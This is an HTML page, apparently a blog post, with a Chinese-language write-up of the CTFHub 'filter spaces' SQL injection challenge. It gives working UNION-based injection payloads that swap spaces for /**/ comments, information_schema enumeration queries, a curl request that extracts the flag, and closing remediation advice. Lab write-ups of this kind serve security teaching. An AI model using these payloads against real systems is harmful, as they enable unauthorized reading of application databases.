@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 过滤空格 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - 过滤空格</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># 过滤空格</span>
+            <span class="tag"># 注释绕过</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>过滤空格</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>绕过空格过滤，利用 SQL 注入读取数据库中的 flag。</li>
+        </ul>
+
+        <h2>二、确认注入点和过滤规则</h2>
+        <p>首页提供 <code>id</code> 查询参数。提交 <code>id=1</code> 后正常返回：</p>
+        <pre>ID: 1
+Data: ctfhub</pre>
+        <p>提交单引号 <code>id=1'</code> 后没有返回数据，说明参数被带入 SQL 查询，且闭合方式需要继续验证。</p>
+        <p>题目提示空格被过滤。直接提交包含普通空格的 Payload 会失败，因此使用 MySQL 行内注释 <code>/**/</code> 代替空格作为语法分隔符。先用真假条件验证：</p>
+        <pre>id=1/**/and/**/1=1#
+
+ID: 1
+Data: ctfhub</pre>
+        <pre>id=1/**/and/**/1=2#
+
+无查询结果</pre>
+        <p>条件为真时正常返回，条件为假时无数据，说明 <code>/**/</code> 已成功绕过空格过滤，且该位置属于数字型注入。</p>
+        <p class="note">这里的 <code>/**/</code> 不是简单删除空格，而是利用 SQL 注释充当词法分隔符，使 <code>1</code>、<code>and</code>、<code>1=1</code> 等 Token 能够被数据库正确解析。</p>
+
+        <h2>三、确定回显列数</h2>
+        <p>使用不存在的负数 <code>-1</code> 避开原记录，并通过 UNION 放置两个测试值：</p>
+        <pre>id=-1/**/union/**/select/**/1,2#
+
+ID: 1
+Data: 2</pre>
+        <p>两个位置均成功回显，可确认查询共有两列，且第 1、2 列都是可见回显位。后续将查询结果放在第 2 列。</p>
+
+        <h2>四、获取数据库基本信息</h2>
+        <pre>id=-1/**/union/**/select/**/database(),version()#
+
+ID: sqli
+Data: 10.3.22-MariaDB-0+deb10u1</pre>
+        <p>当前数据库为 <code>sqli</code>。接下来通过 <code>information_schema</code> 枚举当前库中的表名。</p>
+
+        <h2>五、枚举表和字段</h2>
+        <p>查询当前数据库中的全部表名：</p>
+        <pre>id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
+
+ID: 1
+Data: wfjmjifoio,news</pre>
+        <p>除业务表 <code>news</code> 外，还存在随机表名 <code>wfjmjifoio</code>。继续联合查询表名与字段名：</p>
+        <pre>id=-1/**/union/**/select/**/1,group_concat(table_name,0x3a,column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()#
+
+ID: 1
+Data: wfjmjifoio:yglexuhhcr,news:id,news:data</pre>
+        <p>其中 <code>0x3a</code> 是冒号的十六进制形式，用于分隔表名和字段名。目标数据位于 <code>wfjmjifoio.yglexuhhcr</code>。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。</p>
+
+        <h2>六、读取 Flag</h2>
+        <pre>id=-1/**/union/**/select/**/1,group_concat(yglexuhhcr)/**/from/**/wfjmjifoio#
+
+ID: 1
+Data: ctfhub{34eb4198e6d99531ab71520a}</pre>
+        <p>使用 <code>curl</code> 复现完整请求。参数中的 <code>#</code> 需要交给 <code>--data-urlencode</code> 编码，避免被浏览器或 Shell 当成片段标识符：</p>
+        <pre>curl.exe -sS -G --data-urlencode "id=-1/**/union/**/select/**/1,group_concat(yglexuhhcr)/**/from/**/wfjmjifoio#" "http://&lt;target&gt;/"</pre>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{34eb4198e6d99531ab71520a}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的整数类型校验，只接受合法数字。</li>
+            <li>不要依赖过滤少量字符来防御 SQL 注入；黑名单很容易被注释、编码等方式绕过。</li>
+            <li>生产环境关闭 SQL 语句回显和详细数据库错误信息。</li>
+            <li>数据库账号遵循最小权限原则，限制对 <code>information_schema</code> 和业务表的访问。</li>
+        </ul>
+
+        <h2>九、解题总结</h2>
+        <p>本题的注入流程与普通数字型 UNION 注入一致，区别在于普通空格被过滤。使用 <code>/**/</code> 代替 SQL 语句中的空格，可以保持关键字和表达式之间的语法分隔，从而完成真假验证、字段枚举与 Flag 读取。实际利用时还需注意将 <code>#</code> URL 编码为 <code>%23</code>，或使用 <code>curl --data-urlencode</code> 自动处理。</p>
+    </div>
+</body>
+</html>
